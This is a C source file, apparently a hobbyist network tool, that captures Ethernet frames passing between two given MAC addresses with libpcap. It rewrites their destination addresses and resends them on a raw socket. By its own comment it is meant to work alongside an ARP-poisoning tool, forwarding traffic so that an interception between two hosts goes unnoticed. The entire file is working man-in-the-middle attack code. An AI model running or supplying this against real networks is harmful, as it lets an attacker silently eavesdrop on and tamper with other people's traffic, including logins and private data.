#include"headers.h"
#include"fatal.h"
#include"network.h"
#include"dump.h"
#include<linux/if.h>
#include<string.h>
#include"prand.h"
#include<linux/if_packet.h>
#include <netinet/if_ether.h>
#include<unistd.h>
#include <sys/file.h>
#include <linux/raw.h>

/*Reroutes the caught packets to their appropriate destinations(to be used with arppoison)!
Usage: <MAC 1> <MAC 2>*/


int sock;
struct ifreq ifr;
struct ifreq ifr_idx;
struct sockaddr_ll address;

void caught(u_char *,const struct pcap_pkthdr *,const u_char *);


int main(int argc,char *argv[]){

struct pcap_pkthdr head;
struct bpf_program filter;
char fil_string[100];
char errbuf[PCAP_ERRBUF_SIZE];
pcap_t *handle;
char *device;
char macs[40];

if(argc<3)
fatal("wrong usage:arppacket <MAC 1> <MAC 2>");

sprintf(fil_string,"!arp and ((ether src host %s and ether dst host %s) or (ether src host %s and ether dst host %s))",argv[1],argv[2],argv[2],argv[1]);

if((device=pcap_lookupdev(errbuf))==NULL)
fatal("looking up device");

if((handle=pcap_open_live(device,100000,1,0,errbuf))==NULL)
fatal("pcap open live");

sock=socket(PF_PACKET,SOCK_RAW,htons(ETH_P_ALL));
if(sock==-1)
fatal("in socket");

strncpy(ifr.ifr_name,device,6);
strncpy(ifr_idx.ifr_name,device,6);
if(ioctl(sock,SIOCGIFHWADDR,&ifr)==-1)
fatal("ioctl hwaddr");
if(ioctl(sock,SIOCGIFINDEX,&ifr_idx)==-1)
fatal("ioctl index");

if(pcap_compile(handle,&filter,fil_string,0,0)==-1)
fatal("compilation failed");

if(pcap_setfilter(handle,&filter)==-1)
fatal("set filter failed");

memset(macs,0,40);
strcpy(macs,argv[1]);
strcat(macs,":");
strcat(macs,argv[2]);

while(1)
pcap_loop(handle,1,caught,macs);

}


void caught(u_char *args,const struct pcap_pkthdr *head, const u_char *packet){
int x;
char mac_src[6],mac_dst[6];
bzero(mac_src,6);
bzero(mac_dst,6);
//printf("\n%s\n" ,args+17);
sscanf(args,"%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",&mac_src[0],&mac_src[1],&mac_src[2],&mac_src[3],&mac_src[4],&mac_src[5]);
sscanf(args+17,":%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",&mac_dst[0],&mac_dst[1],&mac_dst[2],&mac_dst[3],&mac_dst[4],&mac_dst[5]);

/*printf("\n\n");
for(int i=0;i<ETHER_ADDR_LEN;i++)
printf(":%02x" ,mac_src[i]);
printf("\n");
for(int i=0;i<ETHER_ADDR_LEN;i++)
printf(":%02x" ,mac_dst[i]);
printf("\n");*/

struct eth_hdr *ether = (struct eth_hdr *)packet;
if(strncmp(mac_src,ether->eth_src_addr,6)==0)
strncpy(ether->eth_dest_addr,mac_dst,6);
else strncpy(ether->eth_dest_addr,mac_src,6);

printf("source MAC address --> ");
printf("%02x" ,ether->eth_src_addr[0]);
for(int i=1;i<ETHER_ADDR_LEN;i++)
printf(":%02x" ,ether->eth_src_addr[i]);
printf("\n");
printf("\tDestination MAC address --> ");
printf("%02x" ,ether->eth_dest_addr[0]);
for(int i=1;i<ETHER_ADDR_LEN;i++)
printf(":%02x" ,ether->eth_dest_addr[i]);
printf("\n");


address.sll_family=AF_PACKET;
address.sll_protocol  = htons(ETH_P_ALL);
address.sll_ifindex=ifr_idx.ifr_ifindex;
address.sll_halen=ETHER_ADDR_LEN;

if((sendto(sock,packet,head->len,0,(struct sockaddr *)&address,sizeof(address)))==-1)
fatal("while sending the packet");

printf("packet rerouted!");
}









